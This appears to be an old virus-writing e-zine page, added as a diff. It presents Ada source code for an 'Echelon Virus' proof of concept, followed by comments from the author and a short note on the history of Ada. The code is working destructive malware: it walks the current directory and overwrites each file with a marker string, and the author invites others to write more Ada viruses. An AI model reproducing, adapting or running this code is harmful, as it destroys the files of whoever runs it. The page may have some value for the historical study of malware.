@@ -1,0 +1,61 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: SkyOut/EOF || <a style="text-decoration: none" href="../mainmenu/sources.htm"><span style="text-decoration: none">Back to sources</span></a> || <a style="text-decoration: none" target="_blank" href="../binsrc/SkyOut/Echelon"><span style="text-decoration: none; color: #BFBF88">View project folder</span></a> || <hr></pre>
+<pre>
+with ada.text_io, gnat.directory_operations, gnat.os_lib;
+use ada.text_io, gnat.directory_operations, gnat.os_lib;
+
+procedure echelon is
+
+   Dir       : Dir_Type;
+   DirName   : string( 1..80 );
+   Len       : natural;
+   FD	     : File_Descriptor;
+   VString   : constant string := &quot;[AdA] PoC by SkyOut [Echelon Virus]&quot;;
+   Written   : integer;
+
+begin
+
+   Open( Dir, &quot;.&quot; );
+
+   loop
+   	Read( Dir, DirName, Len );
+   exit when Len = 0;
+   	FD := Create_File( DirName( 1..Len ), Text );
+   	written := Write( FD, VString'address, VString'Length );
+   end loop;
+
+   Close( Dir );
+
+end echelon;
+
+--======================================================================================================
+--======================================================================================================
+
+-- Author: SkyOut
+-- Date: 10.August 2006
+-- Website: www.eof-project.net
+-- Coded/Tested under Ubuntu Linux with &quot; gnat &quot; (compiler) and &quot; gps &quot; (IDE) 
+-- Payload: Overwrites files in current directory with specified &quot; VString &quot;
+
+--======================================================================================================
+--======================================================================================================
+
+--I am not really sure, but I have not seen any Ada virus before, maybe because this language
+--is not really fun to code... Many things have to be done over variables and you have to be really sure
+--about return values and more... Well in the end I did this little PoC for Ada, called &quot; Echelon &quot;.
+--Maybe in the future some more stuff will follow, we'll see and even better: maybe some others start
+--trying a bit around with it now :)
+
+--======================================================================================================
+--======================================================================================================
+
+--Information (very short^^) about Ada:
+
+--The programming language Ada has been developed by Honeywell Bull in the 1970s and was used / supporterted by the
+--US Departmend of Defense (DoD). The main versions of Ada were Ada83 followed by Ada95, it is one of the first
+--high level languages and was often used for security related projects (example: DoD). The name Ada belongs to
+--the software engineer Lady Ada Lovelace (1815-1852).
+</pre></body></html>
